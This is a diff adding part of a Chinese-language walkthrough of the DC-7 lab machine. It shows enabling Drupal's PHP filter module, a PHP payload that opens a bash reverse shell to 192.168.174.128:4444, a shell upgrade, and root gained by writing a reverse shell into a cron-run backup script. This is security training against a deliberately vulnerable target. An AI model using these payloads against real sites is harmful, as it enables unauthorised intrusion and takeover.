@@ -255,4 +255,47 @@ systemctl restart mysql（重启mysql，不加re是启动）
 
 ![image-20260818212911913](DC_7.assets/image-20260818212911913.png)
 
-这种CMS框架都是可以装插件的，找找有没有可以上传php文件的插件
+这种CMS框架都是可以装插件的，找找有没有可以上传php文件的插件，在官方提供的插件中可以找到![image-20260819231713911](DC_7.assets/image-20260819231713911.png)
+
+从这里进入官方提供的网站，可以直接用url，也可以将压缩包下载到本地，再上传到网站中，网站会自动解压
+
+- 我自己尝试了一些，但是不知道为啥，要么传不上去，要么直接给网站干崩了，我寻思版本也没问题啊，没办法只能借鉴其他大佬的wp，下载这个https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
+- 安装成功后![image-20260819232024315](DC_7.assets/image-20260819232024315.png)
+
+点击启用新添加的模块
+
+![image-20260819232116478](DC_7.assets/image-20260819232116478.png)
+
+勾选php过滤，再拉到最下面点击安装![image-20260819232143772](DC_7.assets/image-20260819232143772.png)
+
+说明模块已经启用
+
+![image-20260819232219826](DC_7.assets/image-20260819232219826.png)
+
+这时就有php了
+
+- 写入内容<?php system("bash -c 'bash -i >& /dev/tcp/192.168.174.128/4444 0>&1'");?>
+
+- 在本地开启监听后，直接在网页内访问![image-20260819232559386](DC_7.assets/image-20260819232559386.png)
+
+成功拿到shell，进入www-data组
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+(Ctrl+z)stty raw -echo; fg
+```
+
+得到功能完整的终端，然后
+
+```
+nano /opt/scripts/backups.sh
+```
+
+写入反弹shell，开启监听后等待几分钟
+
+等了好几分钟也是终于拿到了root![image-20260819234553114](DC_7.assets/image-20260819234553114.png)
+
+## 总结
+
+这个靶机总体感觉有点难度，思路也很新颖，而且真实利用了网站中插件的问题，很有价值
